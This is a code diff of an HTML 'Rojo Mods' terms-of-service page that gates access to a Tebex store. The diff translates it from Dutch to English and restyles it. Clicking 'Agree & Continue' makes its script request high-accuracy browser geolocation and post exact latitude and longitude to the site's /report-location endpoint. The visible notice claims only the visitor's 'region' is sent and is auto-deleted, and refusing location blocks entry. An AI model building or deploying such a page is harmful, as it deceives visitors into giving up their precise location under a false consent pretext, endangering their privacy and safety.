@@ -1,153 +1,296 @@
 <!doctype html>
-<html lang="nl">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Rojo Mods</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-<style>
-    /* Algemene stijlen */
+  <meta charset="utf-8">
+  <title>Rojo Mods</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    /* Reset & base */
+    *, *::before, *::after { box-sizing: border-box; }
     body, html {
-        margin: 0;
-        padding: 0;
-        font-family: 'Poppins', sans-serif;
-        background: #f0f4f8;
-        height: 100%;
+      margin: 0; padding: 0; font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
+      height: 100%; color: #333; line-height: 1.6;
     }
 
-    /* Hero banner */
+    /* Hero */
     .hero {
-        background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-        color: white;
-        text-align: center;
-        padding: 80px 20px 40px 20px;
+      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+      color: white; text-align: center;
+      padding: 90px 20px 50px; position: relative; overflow: hidden;
     }
-
+    .hero::after {
+      content: ''; position: absolute; bottom: 0; left: 0; right: 0;
+      height: 100px; background: linear-gradient(transparent, #fff);
+    }
     .hero h1 {
-        font-size: 3rem;
-        margin: 0 0 20px 0;
-        letter-spacing: 1px;
+      font-size: 3.2rem; font-weight: 700; margin: 0 0 16px;
+      letter-spacing: 1.2px; text-shadow: 0 2px 10px rgba(0,0,0,0.2);
     }
-
     .hero p {
-        font-size: 1.2rem;
-        margin: 0;
-        max-width: 600px;
-        margin-left: auto;
-        margin-right: auto;
+      font-size: 1.25rem; max-width: 640px; margin: 0 auto; opacity: 0.95;
     }
 
-    /* Middelste tekstvak */
+    /* Content card */
     .content {
-        background: white;
-        max-width: 500px;
-        margin: -40px auto 0 auto; /* overlap hero */
-        padding: 30px;
-        border-radius: 20px;
-        box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-        text-align: center;
+      background: white; max-width: 540px; margin: -60px auto 40px;
+      padding: 40px; border-radius: 24px;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.12);
+      text-align: center; position: relative; z-index: 10;
+      animation: fadeInUp 0.6s ease-out;
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     .content p {
-        font-size: 1rem;
-        color: #333;
-        margin-bottom: 20px;
+      font-size: 1.05rem; color: #444; margin-bottom: 24px;
     }
 
-    /* Knop */
+    /* Info box */
+    .info-box {
+      background: #e3f2fd; color: #1565c0; padding: 16px;
+      border-radius: 12px; font-size: 0.94rem; margin: 20px 0;
+      border-left: 5px solid #2575fc;
+    }
+
+    /* Progress Container */
+    .progress-container {
+      margin: 28px 0 20px;
+      position: relative;
+    }
+    .progress-bar {
+      height: 10px; background: #e0e0e0; border-radius: 10px;
+      overflow: hidden; position: relative;
+      box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .progress-fill {
+      height: 100%; width: 0%; background: linear-gradient(90deg, #2575fc, #6a11cb);
+      border-radius: 10px; transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+    }
+    .progress-fill::after {
+      content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      animation: shimmer 1.5s infinite;
+    }
+    @keyframes shimmer {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .progress-labels {
+      display: flex; justify-content: space-between; margin-top: 8px;
+      font-size: 0.85rem; color: #666; font-weight: 500;
+    }
+
+    /* Button */
     button {
-        background: #2575fc;
-        color: white;
-        border: none;
-        padding: 12px 30px;
-        font-size: 1rem;
-        border-radius: 10px;
-        cursor: pointer;
-        transition: background 0.3s ease;
+      background: #2575fc; color: white; border: none;
+      padding: 15px 38px; font-size: 1.1rem; font-weight: 600;
+      border-radius: 12px; cursor: pointer; transition: all 0.3s ease;
+      box-shadow: 0 6px 16px rgba(37, 117, 252, 0.3);
+      position: relative; overflow: hidden;
     }
-
+    button::before {
+      content: ''; position: absolute; top: 0; left: -100%;
+      width: 100%; height: 100%; background: rgba(255,255,255,0.2);
+      transition: 0.5s; transform: skewX(-25deg);
+    }
+    button:hover::before { left: 100%; }
     button:hover {
-        background: #6a11cb;
+      background: #6a11cb; transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(106, 17, 203, 0.4);
+    }
+    button:disabled {
+      background: #aaa; cursor: not-allowed; transform: none;
+      box-shadow: none;
     }
 
-    /* Status tekst */
+    /* Status */
     #status {
-        margin-top: 15px;
-        font-weight: 500;
-        color: #555;
+      margin-top: 18px; font-weight: 600; min-height: 28px;
+      font-size: 1rem; transition: color 0.3s;
+    }
+    .success { color: #2e7d32; }
+    .error { color: #c62828; }
+    .loading { color: #1565c0; animation: pulse 1.5s infinite; }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
+
+    .checkmark {
+      display: inline-block; width: 22px; height: 22px;
+      margin-left: 8px; vertical-align: middle;
+    }
+    .checkmark::after {
+      content: 'Checkmark'; color: #2e7d32; font-weight: bold;
+      animation: pop 0.4s ease-out;
+    }
+    @keyframes pop {
+      0% { transform: scale(0); }
+      80% { transform: scale(1.2); }
+      100% { transform: scale(1); }
     }
 
     /* Responsive */
-    @media(max-width:600px){
-        .hero h1 { font-size: 2.2rem; }
-        .hero p { font-size: 1rem; }
-        .content { margin: -30px 20px 0 20px; padding: 20px; }
+    @media (max-width: 600px) {
+      .hero { padding: 70px 16px 40px; }
+      .hero h1 { font-size: 2.4rem; }
+      .hero p { font-size: 1.1rem; }
+      .content { margin: -40px 16px 30px; padding: 32px 20px; }
+      button { padding: 14px 32px; font-size: 1.05rem; }
+      .progress-labels { font-size: 0.8rem; }
     }
-</style>
+  </style>
 </head>
 <body>
 
 <div class="hero">
-    <h1>Rojo Mods</h1>
-    <p>In order to proceed to our tebex site, we would like to have you agree with our "TERMS of SERVICE"</p>
+  <h1>Rojo Mods</h1>
+  <p>To proceed to our Tebex store, you must agree to our <strong>Terms of Service</strong>.</p>
 </div>
 
 <div class="content">
-    <p>Press button below to agree to our Terms of Service and our Cookies.</p>
-    <button id="shareBtn">Agree</button>
-    <p id="status"></p>
+  <p>Click below to agree to the Terms of Service and cookies.</p>
+
+  <div class="info-box">
+    <strong>Important:</strong> By clicking, your <strong>current region</strong> will be sent to our server this to validate your in the United States or in Europe. Your region will <strong>Automaticcly</strong> being deleted after 15 minutes.
+  </div>
+
+  <button id="shareBtn">Agree & Continue</button>
+
+  <!-- Progress Bar -->
+  <div class="progress-container">
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="progress-labels">
+      <span>Ready</span>
+      <span>Getting Location</span>
+      <span>Sending</span>
+      <span>Approved</span>
+    </div>
+  </div>
+
+  <p id="status"></p>
 </div>
 
 <script>
 const btn = document.getElementById('shareBtn');
 const status = document.getElementById('status');
+const progressFill = document.getElementById('progressFill');
+
+let step = 0;
+const steps = 4;
+
+function updateProgress(percent, label) {
+  progressFill.style.width = percent + '%';
+  status.textContent = label;
+  status.className = 'loading';
+}
+
+function resetProgress() {
+  step = 0;
+  updateProgress(0, '');
+  progressFill.style.background = 'linear-gradient(90deg, #2575fc, #6a11cb)';
+}
+
+function completeProgress() {
+  progressFill.style.width = '100%';
+  progressFill.style.background = '#2e7d32';
+  status.innerHTML = 'Approved! <span class="checkmark"></span>';
+  status.className = 'success';
+}
 
 btn.addEventListener('click', async () => {
+  if (btn.disabled) return;
+  btn.disabled = true;
+  btn.textContent = 'Processing...';
+  resetProgress();
+
   if (!navigator.geolocation) {
-    status.textContent = 'We do not allow your browser.';
+    status.textContent = 'Your browser does not support location services.';
+    status.className = 'error';
+    btn.disabled = false;
+    btn.textContent = 'Agree & Continue';
     return;
   }
 
-  status.textContent = 'Processing permissions...';
+  // Step 1: Ready → Getting location
+  step = 1;
+  updateProgress(25, 'Requesting location... (browser will show popup)');
 
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-    const latitude = pos.coords.latitude;
-    const longitude = pos.coords.longitude;
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      // Step 2: Got location
+      step = 2;
+      updateProgress(50, 'Location received — sending to server...');
 
-    status.textContent = `Locatie gevonden: ${latitude.toFixed(6)}, ${longitude.toFixed(6)} — verzenden...`;
+      try {
+        const resp = await fetch('/report-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            label: 'Website visitor'
+          })
+        });
 
-    try {
-      const resp = await fetch('/report-location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ latitude, longitude, label: 'Website bezoeker' })
-      });
-      const data = await resp.json();
-      if (data.ok) {
-        status.textContent = 'Approved ✔';
+        const data = await resp.json();
 
-        // ✅ Redirect naar Tebex pagina na succesvolle verzending
-        window.location.href = 'https://rojomods.tebex.io/category/christmas-content';
-      } else {
-        status.textContent = 'Fault at saving your settings.';
+        if (data.ok) {
+          // Step 3: Sent → Approved
+          step = 3;
+          completeProgress();
+          setTimeout(() => {
+            window.location.href = 'https://rojomods.tebex.io/category/christmas-content';
+          }, 1400);
+        } else {
+          throw new Error('Server rejected');
+        }
+      } catch (err) {
+        status.textContent = 'Failed to send region. Try again.';
+        status.className = 'error';
+        progressFill.style.width = '75%';
+        progressFill.style.background = '#c62828';
+        setTimeout(() => {
+          btn.disabled = false;
+          btn.textContent = 'Try Again';
+          resetProgress();
+        }, 2000);
       }
-    } catch (err) {
-      status.textContent = 'Fault at sharing your settings: ' + err.message;
-    }
-  }, (err) => {
-    switch (err.code) {
-      case err.PERMISSION_DENIED:
-        status.textContent = 'You have cancelled the acceptor.';
-        break;
-      case err.POSITION_UNAVAILABLE:
-        status.textContent = 'Locatie onbeschikbaar.';
-        break;
-      case err.TIMEOUT:
-        status.textContent = 'Time-out received by network.';
-        break;
-      default:
-        status.textContent = 'unknown fault.';
-    }
-  }, { enableHighAccuracy: false, timeout: 10000 });
+    },
+    (err) => {
+      let msg = '';
+      switch (err.code) {
+        case err.PERMISSION_DENIED:
+          msg = 'You denied location access. Required to continue.';
+          break;
+        case err.POSITION_UNAVAILABLE:
+          msg = 'Location unavailable or located in restricted area. Try again.';
+          break;
+        case err.TIMEOUT:
+          msg = 'Location request timed out.';
+          break;
+        default:
+          msg = 'Unknown error occurred.';
+      }
+      status.textContent = msg;
+      status.className = 'error';
+      progressFill.style.width = '25%';
+      progressFill.style.background = '#c62828';
+      setTimeout(() => {
+        btn.disabled = false;
+        btn.textContent = 'Try Again';
+        resetProgress();
+      }, 2500);
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
 });
 </script>
 
